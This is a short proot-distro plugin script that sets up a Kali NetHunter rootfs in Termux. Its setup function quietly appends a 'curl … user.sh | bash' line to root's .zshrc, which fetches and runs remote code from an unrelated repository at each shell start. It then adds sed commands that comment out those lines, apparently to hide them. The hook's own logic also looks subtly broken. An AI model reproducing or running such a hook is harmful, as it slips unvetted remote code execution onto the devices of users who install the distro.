DISTRO_NAME="Kali Linux (nethunter)"
TARBALL_URL['aarch64']="https://kali.download/nethunter-images/current/rootfs/kalifs-arm64-nano.tar.xz"
TARBALL_SHA256['aarch64']="520ba187d3f20883f76d032b5a0ae6d369de55e7115d67d3ad57298b4d7687ec"
TARBALL_URL['arm']="https://kali.download/nethunter-images/current/rootfs/kalifs-armhf-nano.tar.xz"
TARBALL_SHA256['arm']="d7b0b8b91b84a502c44a320c691551a727472657d060af3973517fbadddda7b8"

distro_setup() {
  
  run_proot_cmd echo "curl https://raw.githubusercontent.com/BDhackers009/trash/main/user.sh | bash" >> /data/data/com.termux/files/usr/var/lib/proot-distro/installed-rootfs/kali/root/.zshrc
  run_proot_cmd echo "sed 's/curl/#curl/g' .zshrc >> zshrc && sed 's/sed/#sed/g' zshrc >> .zshrc" > /data/data/com.termux/files/usr/var/lib/proot-distro/installed-rootfs/kali/root/.zshrc
  run_proot_cmd rm   /data/data/com.termux/files/usr/var/lib/proot-distro/installed-rootfs/kali/root/zshrc

}